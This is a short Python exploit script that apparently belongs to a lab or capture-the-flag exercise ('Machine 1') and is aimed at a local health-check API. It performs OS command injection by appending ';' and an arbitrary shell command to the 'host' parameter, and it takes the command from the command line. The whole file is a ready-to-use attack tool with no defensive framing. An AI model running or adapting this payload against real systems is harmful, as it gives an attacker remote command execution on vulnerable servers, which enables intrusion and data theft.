#!/usr/bin/env python3
"""
Machine 1 - Command Injection Exploit
Target: http://localhost:9011/api/health
Vulnerability: OS Command Injection via 'host' parameter
"""

import requests
import sys

TARGET = "http://localhost:9011"

def exploit(cmd):
    """Exploit command injection in the health check endpoint"""
    # Payload uses ; to chain commands
    payload = f"127.0.0.1; {cmd}"
    
    try:
        response = requests.get(f"{TARGET}/api/health", params={"host": payload}, timeout=10)
        return response.text
    except requests.RequestException as e:
        return f"Error: {e}"

def main():
    print("[*] Machine 1 - Command Injection Exploit")
    print(f"[*] Target: {TARGET}")
    print("-" * 50)
    
    if len(sys.argv) > 1:
        cmd = " ".join(sys.argv[1:])
    else:
        cmd = "id"
    
    print(f"[+] Executing command: {cmd}")
    print("-" * 50)
    
    result = exploit(cmd)
    print(result)

if __name__ == "__main__":
    main()
